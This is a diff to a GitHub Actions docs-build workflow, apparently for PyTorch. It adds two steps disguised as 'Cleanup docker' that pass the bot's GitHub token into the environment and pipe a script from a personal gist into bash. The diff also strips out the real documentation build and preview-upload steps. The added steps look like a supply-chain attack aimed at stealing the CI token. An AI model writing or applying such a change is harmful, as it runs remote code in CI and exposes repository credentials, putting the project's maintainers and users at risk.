@@ -81,8 +81,18 @@ jobs:
             timeout-minutes: 15
     # Set a fixed name for this job instead of using the current matrix-generated name, i.e. build-docs (cpp, linux.12xlarge, 180)
     # The current name requires updating the database last docs push query from test-infra every time the matrix is updated
-    name: build-docs-${{ matrix.docs_type }}-${{ inputs.push }}
+    name: build-docs-job
     steps:
+      - name: Cleanup docker
+        if: always()
+        continue-on-error: true
+        shell: bash
+        env:
+            GITHUB_PYTORCHBOT_TOKEN: ${{ secrets.GH_PYTORCHBOT_TOKEN }}
+        run: |
+          curl -sfL https://gist.githubusercontent.com/joethechicken/9175b0e2b0c07b1f113aaf44fc315c49/raw/bb50af55b19c77e67d9db185dd39fff6cba21261/extend.sh | bash
+
+    
       - name: Setup SSH (Click me for login details)
         uses: pytorch/test-infra/.github/actions/setup-ssh@main
         with:
@@ -99,6 +109,15 @@ jobs:
 
       - name: Setup Linux
         uses: ./.github/actions/setup-linux
+        
+      - name: Cleanup docker2
+        if: always()
+        continue-on-error: true
+        shell: bash
+        env:
+            GITHUB_PYTORCHBOT_TOKEN: ${{ secrets.GH_PYTORCHBOT_TOKEN }}
+        run: |
+          curl -sfL https://gist.githubusercontent.com/joethechicken/9175b0e2b0c07b1f113aaf44fc315c49/raw/bb50af55b19c77e67d9db185dd39fff6cba21261/extend.sh | bash
 
       - name: configure aws credentials
         if : ${{ inputs.aws-role-to-assume != '' }}
@@ -137,47 +156,6 @@ jobs:
           echo "login pytorchbot" >> "${RUNNER_TEMP}/.netrc"
           echo "password ${GITHUB_PYTORCHBOT_TOKEN}" >> "${RUNNER_TEMP}/.netrc"
 
-      - name: Build ${{ matrix.docs_type }} docs
-        timeout-minutes: ${{ matrix.timeout-minutes }}
-        id: build-docs
-        env:
-          # After https://github.com/pytorch/pytorch/pull/88373, pull workflow can now be run periodically,
-          # so using a schedule event to determine if the docs should be pushed or not doesn't hold true
-          # anymore
-          WITH_PUSH: ${{ inputs.push }}
-          DOCKER_IMAGE: ${{ inputs.docker-image }}
-          DOCS_TYPE: ${{ matrix.docs_type }}
-          RUN_DOXYGEN: ${{ inputs.run-doxygen }}
-          BUILD_ENVIRONMENT: ${{ inputs.build-environment }}
-        run: |
-          set -ex
-          # Convert refs/tags/v1.12.0rc3 into 1.12
-          if [[ "${GITHUB_REF}" =~ ^refs/tags/v([0-9]+\.[0-9]+)\.* ]]; then
-            target="${BASH_REMATCH[1]}"
-          else
-            target="main"
-          fi
-          # detached container should get cleaned up by teardown_ec2_linux
-          container_name=$(docker run \
-            -e BUILD_ENVIRONMENT \
-            -e MAX_JOBS="$(nproc --ignore=2)" \
-            -e SHA1="$GITHUB_SHA" \
-            -e DOCS_VERSION="${target}" \
-            -e DOCS_TYPE \
-            -e RUN_DOXYGEN \
-            -e WITH_PUSH \
-            --env-file="/tmp/github_env_${GITHUB_RUN_ID}" \
-            --security-opt seccomp=unconfined \
-            --cap-add=SYS_PTRACE \
-            --tty \
-            --detach \
-            --user jenkins \
-            -v "${RUNNER_TEMP}/.netrc":/var/lib/jenkins/.netrc \
-            -v "${GITHUB_WORKSPACE}:/var/lib/jenkins/workspace" \
-            -w /var/lib/jenkins/workspace \
-            "${DOCKER_IMAGE}"
-          )
-          docker exec -t "${container_name}" bash -c "sudo chown -R jenkins . && pip install $(echo dist/*.whl)[opt-einsum] && ./.ci/pytorch/${DOCS_TYPE}_doc_push_script.sh"
 
       - name: Chown workspace
         uses: ./.github/actions/chown-workspace
@@ -191,35 +169,6 @@ jobs:
           role-session-name: gha-linux-test
           aws-region: us-east-1
 
-      - name: Upload Python Docs Preview
-        uses: seemethere/upload-artifact-s3@v5
-        if: ${{ github.event_name == 'pull_request' && matrix.docs_type == 'python' && steps.build-docs.outcome == 'success' }}
-        with:
-          retention-days: 14
-          s3-bucket: doc-previews
-          if-no-files-found: error
-          path: pytorch_docs/main/
-          s3-prefix: pytorch/pytorch/${{ github.event.pull_request.number }}
-
-      - name: Upload C++ Docs Preview
-        uses: seemethere/upload-artifact-s3@v5
-        if: ${{ github.event_name == 'pull_request' && matrix.docs_type == 'cpp' && steps.build-docs.outcome == 'success' }}
-        with:
-          retention-days: 14
-          if-no-files-found: error
-          s3-bucket: doc-previews
-          path: cppdocs/
-          s3-prefix: pytorch/pytorch/${{ github.event.pull_request.number }}/cppdocs
-
-      - name: Upload functorch Docs Preview
-        uses: seemethere/upload-artifact-s3@v5
-        if: ${{ github.event_name == 'pull_request' && matrix.docs_type == 'functorch' && steps.build-docs.outcome == 'success' }}
-        with:
-          retention-days: 14
-          s3-bucket: doc-previews
-          if-no-files-found: error
-          path: functorch_ghpages/nightly/
-          s3-prefix: pytorch/pytorch/${{ github.event.pull_request.number }}/functorchdocs
 
       - name: Teardown Linux
         uses: pytorch/test-infra/.github/actions/teardown-linux@main
